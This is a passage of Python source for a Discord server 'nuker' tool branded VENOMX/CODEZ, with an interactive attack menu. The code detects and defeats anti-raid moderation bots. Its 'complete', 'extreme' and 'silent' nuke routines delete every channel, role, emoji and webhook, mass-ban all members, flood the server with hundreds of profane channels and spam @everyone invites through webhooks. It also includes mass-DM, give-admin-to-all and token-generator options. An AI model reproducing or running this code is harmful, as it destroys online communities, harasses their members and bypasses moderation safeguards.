        await guild.edit(vanity_code=vanity)
        print(f"✅ Vanity URL changed to: {vanity}")
    except Exception as e:
        print(f"❌ Error: {e}")

async def enable_community(guild):
    """Enable community features"""
    try:
        rules_channel = guild.text_channels[0] if guild.text_channels else None
        updates_channel = guild.text_channels[0] if guild.text_channels else None
        if rules_channel and updates_channel:
            await guild.edit(
                community=True,
                rules_channel=rules_channel,
                public_updates_channel=updates_channel
            )
            print("✅ Community features enabled!")
    except Exception as e:
        print(f"❌ Error: {e}")

async def disable_community(guild):
    """Disable community features"""
    try:
        await guild.edit(community=False)
        print("✅ Community features disabled!")
    except Exception as e:
        print(f"❌ Error: {e}")

async def set_guild_boost_level(guild):
    """Display boost info"""
    print(f"📊 Boost level: {guild.premium_tier}")
    print(f"📊 Boost count: {guild.premium_subscription_count}")
    print(f"📊 Max emojis: {guild.emoji_limit}")

async def create_emoji_bulk(guild):
    """Bulk create emojis"""
    try:
        num = int(input("Number of emojis to create: "))
        name = input("Emoji name prefix: ")
    except:
        num = 10
        name = "emoji"
    
    # Create simple colored circle emojis
    colors = ["🔴", "🟠", "🟡", "🟢", "🔵", "🟣", "⚫", "⚪", "🟤", "🔘"]
    
    created = 0
    for i in range(min(num, 50)):
        try:
            # Create a simple image for emoji (base64 encoded 1x1 pixel)
            img_data = base64.b64decode("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==")
            await guild.create_custom_emoji(name=f"{name}_{i+1}", image=img_data)
            created += 1
        except:
            pass
    print(f"✅ CREATED {created} emojis!")

async def rename_emojis(guild):
    """Rename all emojis"""
    new_name = input("New emoji name: ")
    renamed = 0
    for emoji in guild.emojis:
        try:
            await emoji.edit(name=f"{new_name}_{renamed+1}")
            renamed += 1
            await asyncio.sleep(0.05)
        except:
            pass
    print(f"✅ RENAMED {renamed} emojis!")

async def export_guild_data(guild):
    """Export guild data to JSON"""
    data = {
        "name": guild.name,
        "id": guild.id,
        "owner_id": guild.owner_id,
        "member_count": guild.member_count,
        "channel_count": len(guild.channels),
        "role_count": len(guild.roles),
        "emoji_count": len(guild.emojis),
        "boost_level": guild.premium_tier,
        "boost_count": guild.premium_subscription_count,
        "created_at": str(guild.created_at),
        "verification_level": str(guild.verification_level),
        "explicit_content_filter": str(guild.explicit_content_filter),
        "default_notifications": str(guild.default_notifications),
        "system_channel_flags": str(guild.system_channel_flags),
        "channels": [],
        "roles": [],
        "emojis": []
    }
    
    for channel in guild.channels[:50]:
        data["channels"].append({
            "name": channel.name,
            "type": str(channel.type),
            "id": channel.id
        })
    
    for role in guild.roles[:50]:
        data["roles"].append({
            "name": role.name,
            "id": role.id,
            "color": str(role.color),
            "position": role.position
        })
    
    for emoji in guild.emojis[:50]:
        data["emojis"].append({
            "name": emoji.name,
            "id": emoji.id,
            "animated": emoji.animated
        })
    
    filename = f"guild_{guild.id}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(filename, 'w') as f:
        json.dump(data, f, indent=2)
    print(f"✅ Exported guild data to {filename}!")

async def display_guild_info(guild):
    """Display guild information"""
    print("\n" + "═" * 50)
    print(f"📊 GUILD INFORMATION")
    print("═" * 50)
    print(f"   Name: {guild.name}")
    print(f"   ID: {guild.id}")
    print(f"   Owner: {guild.owner}")
    print(f"   Members: {guild.member_count}")
    print(f"   Channels: {len(guild.channels)}")
    print(f"   Roles: {len(guild.roles)}")
    print(f"   Emojis: {len(guild.emojis)}")
    print(f"   Boost Level: {guild.premium_tier}")
    print(f"   Boost Count: {guild.premium_subscription_count}")
    print(f"   Verification: {guild.verification_level}")
    print(f"   Created: {guild.created_at.strftime('%Y-%m-%d %H:%M:%S')}")
    print("═" * 50)

# ============ ANTI-NUKE BYPASS ============

async def detect_antinuke_bots(guild):
    """Detect anti-nuke bots in guild"""
    detected = []
    for member in guild.members:
        if member.bot:
            name_lower = member.name.lower()
            for bot_name, keywords in ANTINUKE_BOTS.items():
                for keyword in keywords:
                    if keyword in name_lower:
                        detected.append({
                            "name": member.name,
                            "id": member.id,
                            "type": bot_name,
                            "role_position": member.top_role.position if member.top_role else 0
                        })
                        break
                if member.id in [d["id"] for d in detected]:
                    break
    return detected

async def bypass_antinuke_bots(guild):
    """Bypass anti-nuke bots by whitelisting them"""
    detected = await detect_antinuke_bots(guild)
    if detected:
        print(f"\n⚠️ DETECTED {len(detected)} ANTI-NUKE BOTS:")
        for bot in detected:
            whitelisted_users.add(bot["id"])
            print(f"   ✅ Whitelisted: {bot['name']} (Type: {bot['type']})")
        save_whitelist()
        print(f"\n✅ SUCCESSFULLY BYPASSED {len(detected)} ANTI-NUKE BOTS!")
    else:
        print("\n✅ NO ANTI-NUKE BOTS DETECTED!")
    return len(detected)

async def kill_antinuke_bots(guild):
    """Attempt to ban anti-nuke bots"""
    detected = await detect_antinuke_bots(guild)
    if not detected:
        print("✅ No anti-nuke bots found!")
        return
    
    print(f"\n🔨 ATTEMPTING TO BAN {len(detected)} ANTI-NUKE BOTS...")
    banned = 0
    for bot in detected:
        try:
            member = guild.get_member(bot["id"])
            if member:
                await member.ban(reason="BYPASSED & BANNED BY VENOMX")
                banned += 1
                print(f"   ✅ Banned: {bot['name']}")
        except:
            print(f"   ❌ Failed to ban: {bot['name']}")
            whitelisted_users.add(bot["id"])
    
    save_whitelist()
    print(f"\n✅ BANNED {banned}/{len(detected)} ANTI-NUKE BOTS!")

async def scan_server(guild):
    """Full server scan"""
    print("\n" + "═" * 50)
    print("🔍 SERVER SCAN RESULTS")
    print("═" * 50)
    
    # Member stats
    members = list(guild.members)
    bots = [m for m in members if m.bot]
    admins = [m for m in members if m.guild_permissions.administrator and not m.bot]
    
    print(f"📊 MEMBERS:")
    print(f"   Total: {len(members)}")
    print(f"   Bots: {len(bots)}")
    print(f"   Admins: {len(admins)}")
    
    # Channel stats
    text_channels = len(guild.text_channels)
    voice_channels = len(guild.voice_channels)
    categories = len(guild.categories)
    
    print(f"\n📁 CHANNELS:")
    print(f"   Text: {text_channels}")
    print(f"   Voice: {voice_channels}")
    print(f"   Categories: {categories}")
    
    # Role stats
    roles = [r for r in guild.roles if r != guild.default_role]
    hoist_roles = [r for r in roles if r.hoist]
    mentionable_roles = [r for r in roles if r.mentionable]
    
    print(f"\n🎭 ROLES:")
    print(f"   Total: {len(roles)}")
    print(f"   Hoist: {len(hoist_roles)}")
    print(f"   Mentionable: {len(mentionable_roles)}")
    
    # Security
    print(f"\n🛡️ SECURITY:")
    print(f"   Verification Level: {guild.verification_level}")
    print(f"   2FA Required: {guild.mfa_level == discord.MFALevel.require_2fa}")
    
    # Anti-nuke bots
    antinuke = await detect_antinuke_bots(guild)
    if antinuke:
        print(f"\n⚠️ ANTI-NUKE BOTS DETECTED: {len(antinuke)}")
        for bot in antinuke[:5]:
            print(f"   • {bot['name']} ({bot['type']})")
    else:
        print(f"\n✅ NO ANTI-NUKE BOTS DETECTED")
    
    print("═" * 50)

# ============ COMPLETE NUKE (ALL IN ONE) ============

async def complete_mega_nuke(guild, bot_user):
    """Complete mega nuke - destroys everything"""
    print("\n" + "💀" * 30)
    print("💀 COMPLETE MEGA NUKE - TOTAL DESTRUCTION")
    print("💀 FUCKED BY CODΞZ | VOID | N4KED BY CODΞZ")
    print("💀" * 30 + "\n")
    
    start_time = time.time()
    
    # Phase 1: Detect and bypass anti-nuke bots
    print("[PHASE 1] BYPASSING ANTI-NUKE BOTS...")
    bypassed = await bypass_antinuke_bots(guild)
    
    # Phase 2: Delete all webhooks
    print("\n[PHASE 2] DELETING WEBHOOKS...")
    for channel in guild.text_channels:
        try:
            webhooks = await channel.webhooks()
            await asyncio.gather(*[wh.delete() for wh in webhooks], return_exceptions=True)
        except:
            pass
    print("   ✅ Webhooks deleted")
    
    # Phase 3: Delete all channels
    print("\n[PHASE 3] DELETING CHANNELS...")
    channels = list(guild.channels)
    for i in range(0, len(channels), 50):
        batch = channels[i:i+50]
        await asyncio.gather(*[c.delete() for c in batch], return_exceptions=True)
        print(f"   ✅ Deleted {min(i+50, len(channels))}/{len(channels)}")
        await asyncio.sleep(0.01)
    
    # Phase 4: Delete all roles
    print("\n[PHASE 4] DELETING ROLES...")
    roles = [r for r in guild.roles if r != guild.default_role and r != guild.me.top_role]
    for i in range(0, len(roles), 50):
        batch = roles[i:i+50]
        await asyncio.gather(*[r.delete() for r in batch], return_exceptions=True)
        print(f"   ✅ Deleted {min(i+50, len(roles))}/{len(roles)}")
        await asyncio.sleep(0.01)
    
    # Phase 5: Delete all emojis & stickers
    print("\n[PHASE 5] DELETING EMOJIS & STICKERS...")
    await asyncio.gather(
        *[e.delete() for e in guild.emojis],
        *[s.delete() for s in guild.stickers] if hasattr(guild, 'stickers') else [],
        return_exceptions=True
    )
    print("   ✅ Emojis & stickers deleted")
    
    # Phase 6: Ban all members
    print("\n[PHASE 6] BANNING MEMBERS...")
    members = [m for m in guild.members if m.id not in whitelisted_users and m != bot_user]
    for i in range(0, len(members), 200):
        batch = members[i:i+200]
        await asyncio.gather(*[m.ban(reason="FUCKED BY CODΞZ | discord.gg/codez", delete_message_days=0) for m in batch], return_exceptions=True)
        print(f"   ✅ Banned {min(i+200, len(members))}/{len(members)}")
        await asyncio.sleep(0.02)
    
    # Phase 7: Flood with channels
    print("\n[PHASE 7] FLOODING WITH CHANNELS...")
    for i in range(500):
        try:
            await guild.create_text_channel(f"FUCKED-BY-CODEZ-{i}")
            if i % 50 == 0:
                print(f"   ✅ Created {i+50}/500")
        except:
            pass
        await asyncio.sleep(0.001)
    
    # Phase 8: Create webhooks and spam
    print("\n[PHASE 8] WEBHOOK SPAM...")
    new_channels = list(guild.channels)[:50]
    webhooks = []
    for ch in new_channels:
        try:
            wh = await ch.create_webhook(name="CODEZ")
            webhooks.append(wh)
        except:
            pass
    
    spam_msg = "@everyone **SERVER NUKED BY VENOMX**\n**FUCKED BY CODΞZ & VOID**\n**N4KED BY CODΞZ**\n**JOIN: discord.gg/codez**"
    tasks = []
    for wh in webhooks:
        for _ in range(100):
            tasks.append(wh.send(spam_msg))
    await asyncio.gather(*tasks[:1000], return_exceptions=True)
    print(f"   ✅ Spammed with {len(webhooks)} webhooks")
    
    # Phase 9: Change guild info
    print("\n[PHASE 9] OVERWRITING GUILD INFO...")
    try:
        await guild.edit(
            name="NUKED-BY-VENOMX",
            description="💀 FUCKED BY CODΞZ | VOID | N4KED BY CODΞZ 💀\nJOIN: discord.gg/codez"
        )
        print("   ✅ Guild name changed")
    except:
        pass
    
    # Final
    elapsed = time.time() - start_time
    print("\n" + "=" * 50)
    print("💀 COMPLETE MEGA NUKE FINISHED! 💀")
    print(f"⏱️ Time taken: {elapsed:.1f} seconds")
    print(f"📊 Stats:")
    print(f"   • Channels deleted: {len(channels)}")
    print(f"   • Roles deleted: {len(roles)}")
    print(f"   • Members banned: {len(members)}")
    print(f"   • New channels: 500")
    print(f"   • Webhooks created: {len(webhooks)}")
    print(f"   • Anti-nuke bots bypassed: {bypassed}")
    print("=" * 50)
    print("💀 discord.gg/codez 💀")

async def extreme_nuke(guild, bot_user):
    """Extreme nuke - even faster"""
    print("\n⚡ EXTREME NUKE - MAXIMUM SPEED ⚡")
    start = time.time()
    
    # All deletions in one go
    await asyncio.gather(
        *[c.delete() for c in guild.channels],
        *[r.delete() for r in guild.roles if r != guild.default_role],
        *[e.delete() for e in guild.emojis],
        return_exceptions=True
    )
    
    # Quick ban
    members = [m for m in guild.members if m != bot_user]
    for i in range(0, len(members), 200):
        await asyncio.gather(*[m.ban(reason="VENOMX") for m in members[i:i+200]], return_exceptions=True)
    
    # Flood
    for i in range(300):
        await guild.create_text_channel(f"VX-{i}")
    
    elapsed = time.time() - start
    print(f"✅ EXTREME NUKE DONE in {elapsed:.1f}s!")

async def silent_nuke(guild, bot_user):
    """Silent nuke - no console output"""
    await asyncio.gather(
        *[c.delete() for c in guild.channels],
        *[r.delete() for r in guild.roles if r != guild.default_role],
        *[e.delete() for e in guild.emojis],
        return_exceptions=True
    )
    members = [m for m in guild.members if m != bot_user]
    await asyncio.gather(*[m.ban(reason="SILENT NUKE") for m in members[:1000]], return_exceptions=True)
    for i in range(200):
        await guild.create_text_channel(f"NUKED-{i}")

# ============ WHITELIST/BLACKLIST MANAGEMENT ============

def save_whitelist():
    with open('whitelist.json', 'w') as f:
        json.dump({'users': list(whitelisted_users)}, f)

def save_blacklist():
    with open('blacklist.json', 'w') as f:
        json.dump({'users': list(blacklisted_users)}, f)

async def whitelist_menu():
    while True:
        print("\n" + "═" * 50)
        print("👤 WHITELIST MANAGEMENT")
        print("═" * 50)
        print("1️⃣ Add user to whitelist")
        print("2️⃣ Remove user from whitelist")
        print("3️⃣ View whitelist")
        print("4️⃣ Add multiple users")
        print("5️⃣ Import whitelist from file")
        print("6️⃣ Export whitelist to file")
        print("7️⃣ Clear whitelist")
        print("8️⃣ Back to main menu")
        
        choice = input("\n⚡ ")
        
        if choice == '1':
            uid = input("User ID: ")
            try:
                whitelisted_users.add(int(uid))
                save_whitelist()
                print(f"✅ Added {uid} to whitelist!")
            except:
                print("❌ Invalid ID!")
                
        elif choice == '2':
            uid = input("User ID: ")
            try:
                whitelisted_users.discard(int(uid))
                save_whitelist()
                print(f"✅ Removed {uid} from whitelist!")
            except:
                print("❌ Invalid ID!")
                
        elif choice == '3':
            if whitelisted_users:
                print(f"\n📋 WHITELISTED USERS ({len(whitelisted_users)}):")
                for uid in list(whitelisted_users)[:20]:
                    print(f"   • {uid}")
                if len(whitelisted_users) > 20:
                    print(f"   ... and {len(whitelisted_users)-20} more")
            else:
                print("\n📋 Whitelist is empty!")
                
        elif choice == '4':
            uids = input("User IDs (comma separated): ")
            for uid in uids.split(','):
                try:
                    whitelisted_users.add(int(uid.strip()))
                except:
                    pass
            save_whitelist()
            print(f"✅ Added users to whitelist!")
            
        elif choice == '5':
            filename = input("Filename: ")
            try:
                with open(filename, 'r') as f:
                    uids = [int(l.strip()) for l in f.readlines() if l.strip().isdigit()]
                whitelisted_users.update(uids)
                save_whitelist()
                print(f"✅ Imported {len(uids)} users!")
            except:
                print("❌ Error reading file!")
                
        elif choice == '6':
            filename = input("Save as: ")
            with open(filename, 'w') as f:
                f.write('\n'.join(str(uid) for uid in whitelisted_users))
            print(f"✅ Exported {len(whitelisted_users)} users to {filename}!")
            
        elif choice == '7':
            confirm = input("Clear ALL whitelisted users? (y/n): ")
            if confirm.lower() == 'y':
                whitelisted_users.clear()
                save_whitelist()
                print("✅ Whitelist cleared!")
                
        elif choice == '8':
            break
        
        await asyncio.sleep(1)

async def blacklist_menu():
    while True:
        print("\n" + "═" * 50)
        print("🚫 BLACKLIST MANAGEMENT")
        print("═" * 50)
        print("1️⃣ Add user to blacklist")
        print("2️⃣ Remove user from blacklist")
        print("3️⃣ View blacklist")
        print("4️⃣ Back to main menu")
        
        choice = input("\n⚡ ")
        
        if choice == '1':
            uid = input("User ID: ")
            try:
                blacklisted_users.add(int(uid))
                save_blacklist()
                print(f"✅ Added {uid} to blacklist!")
            except:
                print("❌ Invalid ID!")
                
        elif choice == '2':
            uid = input("User ID: ")
            try:
                blacklisted_users.discard(int(uid))
                save_blacklist()
                print(f"✅ Removed {uid} from blacklist!")
            except:
                print("❌ Invalid ID!")
                
        elif choice == '3':
            if blacklisted_users:
                print(f"\n🚫 BLACKLISTED USERS ({len(blacklisted_users)}):")
                for uid in list(blacklisted_users)[:20]:
                    print(f"   • {uid}")
            else:
                print("\n🚫 Blacklist is empty!")
                
        elif choice == '4':
            break
        
        await asyncio.sleep(1)

# ============ CONFIG MANAGEMENT ============

def save_config():
    with open('config.json', 'w') as f:
        json.dump(current_config, f, indent=2)

async def config_menu():
    global current_config, mode, auto_bypass
    
    while True:
        print("\n" + "═" * 50)
        print("⚙️ CONFIGURATION MENU")
        print("═" * 50)
        print(f"1️⃣ Mode: {mode}")
        print(f"2️⃣ Auto Bypass: {'ON' if auto_bypass else 'OFF'}")
        print("3️⃣ Configure Spam Messages")
        print("4️⃣ Configure Channel Names")
        print("5️⃣ Configure Role Names")
        print("6️⃣ Configure Webhook Settings")
        print("7️⃣ Configure Embed Settings")
        print("8️⃣ Reset to Default")
        print("9️⃣ Save Config")
        print("🔟 Load Config")
        print("1️⃣1️⃣ Back to Main Menu")
        
        choice = input("\n⚡ ")
        
        if choice == '1':
            modes = ["ULTRA", "STEALTH", "EXTREME"]
            current_idx = modes.index(mode) if mode in modes else 0
            mode = modes[(current_idx + 1) % 3]
            print(f"✅ Mode changed to: {mode}")
            
        elif choice == '2':
            auto_bypass = not auto_bypass
            print(f"✅ Auto Bypass: {'ON' if auto_bypass else 'OFF'}")
            
        elif choice == '3':
            print("\nCurrent spam messages:")
            for i, msg in enumerate(current_config.get('spam_messages', [])):
                print(f"   {i+1}. {msg}")
            add = input("Add new message (or press enter to skip): ")
            if add:
                current_config.setdefault('spam_messages', []).append(add)
                print("✅ Message added!")
                
        elif choice == '4':
            name = input("New channel name template: ")
            if name:
                current_config['channel_names'] = [name]
                print("✅ Channel name updated!")
                
        elif choice == '5':
            name = input("New role name template: ")
            if name:
                current_config['role_names'] = [name]
                print("✅ Role name updated!")
                
        elif choice == '6':
            name = input("Webhook name: ")
            if name:
                current_config['webhook_name'] = name
                print("✅ Webhook name updated!")
                
        elif choice == '7':
            title = input("Embed title: ")
            if title:
                current_config['embed_title'] = title
            desc = input("Embed description: ")
            if desc:
                current_config['embed_description'] = desc
            print("✅ Embed settings updated!")
            
        elif choice == '8':
            current_config = {
                "spam_messages": ["@everyome NUKED BY VENOMX", "JOIN discord.gg/codez", "FUCKED BY CODEZ"],
                "channel_names": ["NUKE", "CODEZ", "VENOMX", "FUCKED"],
                "role_names": ["ADMIN", "VENOMX", "CODEZ", "OWNER"],
                "webhook_name": "VENOMX",
                "guild_name": "NUKED-BY-VENOMX",
                "embed_title": "VENOMX RAID",
                "embed_description": "SERVER HAS BEEN NUKED",
                "embed_color": 0xFF0000
            }
            print("✅ Config reset to default!")
            
        elif choice == '9':
            save_config()
            print("✅ Config saved!")
            
        elif choice == '10':
            try:
                with open('config.json', 'r') as f:
                    current_config = json.load(f)
                print("✅ Config loaded!")
            except:
                print("❌ No saved config found!")
                
        elif choice == '11':
            break
        
        await asyncio.sleep(1)

# ============ STATISTICS ============

async def show_stats():
    print("\n" + "═" * 50)
    print("📊 VENOMX STATISTICS")
    print("═" * 50)
    print(f"🔨 Bans: {stats['bans']}")
    print(f"👢 Kicks: {stats['kicks']}")
    print(f"📁 Channels Created: {stats['channels_created']}")
    print(f"🗑️ Channels Deleted: {stats['channels_deleted']}")
    print(f"🎭 Roles Created: {stats['roles_created']}")
    print(f"🗑️ Roles Deleted: {stats['roles_deleted']}")
    print(f"🗑️ Emojis Deleted: {stats['emojis_deleted']}")
    print(f"🗑️ Stickers Deleted: {stats['stickers_deleted']}")
    print(f"💬 Messages Sent: {stats['messages_sent']}")
    print(f"📨 DMs Sent: {stats['dms_sent']}")
    print(f"🌊 Webhooks Created: {stats['webhooks_created']}")
    print(f"🌊 Webhook Messages: {stats['webhook_messages']}")
    print(f"⏰ Timeouts Applied: {stats['timeouts_applied']}")
    print(f"👑 Admins Granted: {stats['admins_granted']}")
    print("═" * 50)
    await asyncio.sleep(3)

async def reset_stats():
    global stats
    confirm = input("Reset all statistics? (y/n): ")
    if confirm.lower() == 'y':
        stats = {
            "bans": 0, "kicks": 0, "channels_created": 0, "channels_deleted": 0,
            "roles_created": 0, "roles_deleted": 0, "emojis_deleted": 0,
            "stickers_deleted": 0, "messages_sent": 0, "dms_sent": 0,
            "webhooks_created": 0, "webhook_messages": 0, "timeouts_applied": 0,
            "admins_granted": 0
        }
        print("✅ Statistics reset!")

# ============ MAIN MENU ============

async def main_menu(bot_instance):
    global server_id
    
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print(banner)
        
        guild = bot_instance.get_guild(int(server_id)) if server_id else None
        guild_name = guild.name if guild else "No Target"
        
        print(f"""
╔═══════════════════════════════════════════════════════════════════════════════╗
║                              MAIN MENU                                        ║
╠═══════════════════════════════════════════════════════════════════════════════╣
║  🎯 TARGET: {guild_name:<55} ║
║  👥 WHITELISTED: {len(whitelisted_users)}  |  MODE: {mode}  |  AUTO-BYPASS: {'✅' if auto_bypass else '❌'}                      ║
╠═══════════════════════════════════════════════════════════════════════════════╣
║                                                                               ║
║  ⚔️ DESTRUCTION                                                               ║
║  1️⃣  BAN ALL          2️⃣  KICK ALL         3️⃣  PRUNE MEMBERS                ║
║  4️⃣  CREATE CHANNELS   5️⃣  DELETE CHANNELS   6️⃣  CREATE ROLES                 ║
║  7️⃣  DELETE ROLES      8️⃣  SPAM CHANNELS     9️⃣  DM ALL                       ║
║  1️⃣0️⃣ DELETE EMOJIS    1️⃣1️⃣ DELETE STICKERS  1️⃣2️⃣ GIVE ADMIN                 ║
║  1️⃣3️⃣ STRIP PERMS      1️⃣4️⃣ TIMEOUT ALL      1️⃣5️⃣ REMOVE TIMEOUTS            ║
║  1️⃣6️⃣ LOCK CHANNELS    1️⃣7️⃣ UNLOCK CHANNELS  1️⃣8️⃣ RENAME CHANNELS            ║
║  1️⃣9️⃣ RENAME ROLES     2️⃣0️⃣ WEBHOOK SPAM     2️⃣1️⃣ MASS WEBHOOKS              ║
║  2️⃣2️⃣ DELETE WEBHOOKS  2️⃣3️⃣ VOICE CHANNELS   2️⃣4️⃣ CREATE VOICE               ║
║  2️⃣5️⃣ CREATE CATEGORY  2️⃣6️⃣ CREATE THREADS   2️⃣7️⃣ REACTION SPAM              ║
║  2️⃣8️⃣ NUKE CHANNELS    2️⃣9️⃣ CLONE CHANNELS   3️⃣0️⃣ SLOWMODE ALL               ║
║  3️⃣1️⃣ MASS PIN         3️⃣2️⃣ MASS UNPIN      3️⃣3️⃣ CHANGE ICON                ║
║  3️⃣4️⃣ CHANGE NAME      3️⃣5️⃣ CHANGE DESC     3️⃣6️⃣ DELETE INVITES             ║
║  3️⃣7️⃣ CREATE INVITE    3️⃣8️⃣ RENAME MEMBERS   3️⃣9️⃣ CREATE EMOJIS              ║
║  4️⃣0️⃣ RENAME EMOJIS                                                          ║
║                                                                               ║
║  💣 MEGA NUKE                                                                ║
║  4️⃣1️⃣ COMPLETE NUKE    4️⃣2️⃣ EXTREME NUKE    4️⃣3️⃣ SILENT NUKE               ║
║                                                                               ║
║  🛡️ ANTI-NUKE BYPASS                                                          ║
║  4️⃣4️⃣ SCAN ANTI-NUKE    4️⃣5️⃣ BYPASS BOTS     4️⃣6️⃣ KILL BOTS                 ║
║  4️⃣7️⃣ SERVER SCAN                                                           ║
║                                                                               ║
║  🔧 MANAGEMENT                                                               ║
║  4️⃣8️⃣ WHITELIST MENU    4️⃣9️⃣ BLACKLIST MENU   5️⃣0️⃣ CONFIG MENU              ║
║  5️⃣1️⃣ TOKEN GENERATOR   5️⃣2️⃣ VIEW STATS       5️⃣3️⃣ RESET STATS              ║
║  5️⃣4️⃣ SWITCH GUILD      5️⃣5️⃣ GUILD INFO       5️⃣6️⃣ EXPORT DATA              ║
║  5️⃣7️⃣ ENABLE COMMUNITY  5️⃣8️⃣ DISABLE COMMUNITY                             ║
║                                                                               ║
║  5️⃣9️⃣ EXIT                                                                  ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
        """)
        
        choice = input("⚡ VENOMX → ")
        
        if not guild and choice not in ['54', '59']:
            print("❌ No guild selected! Use option 54 to set guild ID")
            await asyncio.sleep(1)
            continue
        
        # Destruction
        if choice == '1' and guild:
            await ban_all_members(guild, bot_instance.user)
        elif choice == '2' and guild:
            await kick_all_members(guild, bot_instance.user)
        elif choice == '3' and guild:
            await prune_members(guild)
        elif choice == '4' and guild:
            await create_channels_bulk(guild)
        elif choice == '5' and guild:
            await delete_all_channels(guild)
        elif choice == '6' and guild:
            await create_roles_bulk(guild)
        elif choice == '7' and guild:
            await delete_all_roles(guild)
        elif choice == '8' and guild:
            await spam_channels(guild)
        elif choice == '9' and guild:
            await dm_all_members(guild, bot_instance.user)
        elif choice == '10' and guild:
            await delete_all_emojis(guild)
        elif choice == '11' and guild:
            await delete_all_stickers(guild)
        elif choice == '12' and guild:
            await give_admin_to_all(guild)
        elif choice == '13' and guild:
            await strip_all_permissions(guild)
        elif choice == '14' and guild:
            await timeout_all_members(guild)
        elif choice == '15' and guild:
            await remove_all_timeouts(guild)
        elif choice == '16' and guild:
            await lock_all_channels(guild)
        elif choice == '17' and guild:
            await unlock_all_channels(guild)
        elif choice == '18' and guild:
            await rename_all_channels(guild)
        elif choice == '19' and guild:
            await rename_all_roles(guild)
        elif choice == '20' and guild:
            await create_webhooks_spam(guild)
        elif choice == '21' and guild:
            await mass_webhook_creation(guild)
        elif choice == '22' and guild:
            await delete_all_webhooks(guild)
        elif choice == '23' and guild:
            await delete_all_voice_channels(guild)
        elif choice == '24' and guild:
            await create_voice_channels(guild)
        elif choice == '25' and guild:
            await create_category_channels(guild)
        elif choice == '26' and guild:
            await create_threads(guild)
        elif choice == '27' and guild:
            await mass_reaction_spam(guild)
        elif choice == '28' and guild:
            await nuke_all_channels(guild)
        elif choice == '29' and guild:
            await clone_channels(guild)
        elif choice == '30' and guild:
            await slowmode_all(guild)
        elif choice == '31' and guild:
            await mass_pin_messages(guild)
        elif choice == '32' and guild:
            await mass_unpin_messages(guild)
        elif choice == '33' and guild:
            await change_guild_icon(guild)
        elif choice == '34' and guild:
            await change_guild_name(guild)
        elif choice == '35' and guild:
            await change_guild_description(guild)
        elif choice == '36' and guild:
            await delete_all_invites(guild)
        elif choice == '37' and guild:
            await create_invite(guild)
        elif choice == '38' and guild:
            await rename_all_members(guild, bot_instance.user)
        elif choice == '39' and guild:
            await create_emoji_bulk(guild)
        elif choice == '40' and guild:
            await rename_emojis(guild)
        # Mega Nuke
        elif choice == '41' and guild:
            await complete_mega_nuke(guild, bot_instance.user)
        elif choice == '42' and guild:
            await extreme_nuke(guild, bot_instance.user)
        elif choice == '43' and guild:
            await silent_nuke(guild, bot_instance.user)
        # Anti-Nuke
        elif choice == '44' and guild:
            detected = await detect_antinuke_bots(guild)
            if detected:
                print(f"\n⚠️ Found {len(detected)} anti-nuke bots:")
                for bot in detected:
                    print(f"   • {bot['name']} ({bot['type']})")
            else:
                print("\n✅ No anti-nuke bots found!")
        elif choice == '45' and guild:
            await bypass_antinuke_bots(guild)
        elif choice == '46' and guild:
            await kill_antinuke_bots(guild)
        elif choice == '47' and guild:
            await scan_server(guild)
        # Management
        elif choice == '48':
            await whitelist_menu()
        elif choice == '49':
            await blacklist_menu()
        elif choice == '50':
            await config_menu()
        elif choice == '51':
            await token_generator_menu()
        elif choice == '52':
            await show_stats()
        elif choice == '53':
            await reset_stats()
        elif choice == '54':
            server_id = input("Enter Guild ID: ")
            print(f"✅ Switched to guild: {server_id}")
        elif choice == '55' and guild:
            await display_guild_info(guild)
        elif choice == '56' and guild:
            await export_guild_data(guild)
        elif choice == '57' and guild:
            await enable_community(guild)
        elif choice == '58' and guild:
            await disable_community(guild)
        elif choice == '59':
            print("👋 Goodbye!")
            print("💀 discord.gg/codez 💀")
            await bot_instance.close()
            os._exit(0)
        else:
            print("❌ Invalid choice!")
        
        await asyncio.sleep(1)
        if choice not in ['52', '55']:
            input("\nPress ENTER to continue...")

# ============ BOT SETUP ============

async def main():
    global server_id, bot_token
    
    print(banner)
    print("\n" + "=" * 70)
    print("🔥 VENOMX COMPLETE EDITION v8.0 🔥")
    print("💀 FUCKED BY CODΞZ | VOID | N4KED BY CODΞZ 💀")
    print("📢 JOIN: discord.gg/codez")
    print("=" * 70)
    
    # Token selection
    print("\n🔑 TOKEN OPTIONS:")
    print("1️⃣ Enter bot token")
    print("2️⃣ Generate token")
    print("3️⃣ Load from file")
    
    choice = input("\n⚡ ")
    
    if choice == '2':
        bot_token = generate_discord_token()
        print(f"\n✅ Generated token: {bot_token[:30]}...")
        save = input("Save to tokens.txt? (y/n): ")
        if save.lower() == 'y':
            with open('tokens.txt', 'a') as f:
                f.write(f"{bot_token}\n")
    elif choice == '3':
        filename = input("Filename: ")
        try:
            with open(filename, 'r') as f:
                bot_token = f.readline().strip()
            print(f"✅ Loaded token from {filename}")
        except:
            print("❌ File not found!")
            bot_token = input("Enter token: ")
    else:
        bot_token = input("Enter bot token: ")
    
    if not bot_token or len(bot_token) < 50:
        print("❌ Invalid token!")
        return
    
    server_id = input("\n🎯 Target Guild ID: ")
    
    # Create and run bot
    intents = discord.Intents.all()
    bot_instance = commands.Bot(command_prefix=".", intents=intents, help_command=None)
    
    @bot_instance.event
    async def on_ready():
        os.system('cls' if os.name == 'nt' else 'clear')
        print(banner)
        print(f"\n✅ Logged in as: {bot_instance.user.name}")
        print(f"✅ Bot ID: {bot_instance.user.id}")
        print(f"✅ Ping: {round(bot_instance.latency * 1000)}ms")
        print(f"✅ Whitelisted: {len(whitelisted_users)}")
        print(f"✅ Mode: {mode}")
        print(f"✅ Auto Bypass: {'ON' if auto_bypass else 'OFF'}")
        print("\n💀 discord.gg/codez 💀")
        await main_menu(bot_instance)
    
    try:
        await bot_instance.start(bot_token)
    except Exception as e:
        print(f"❌ Error: {e}")

if __name__ == "__main__":
    asyncio.run(main())
